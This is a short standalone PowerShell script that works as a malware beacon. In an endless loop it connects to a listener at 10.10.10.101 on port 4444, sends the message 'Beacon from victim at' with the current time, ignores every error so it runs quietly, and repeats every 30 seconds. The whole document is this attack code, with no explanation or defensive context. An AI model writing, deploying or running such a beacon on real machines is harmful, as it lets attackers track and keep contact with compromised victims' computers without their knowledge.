while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient("10.10.10.101", 4444)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.WriteLine("Beacon from victim at $(Get-Date)")
        $writer.Flush()
        $writer.Dispose()
        $stream.Dispose()
        $client.Dispose()
    } catch {
        # Ignore errors
    }
    Start-Sleep -Seconds 30
}
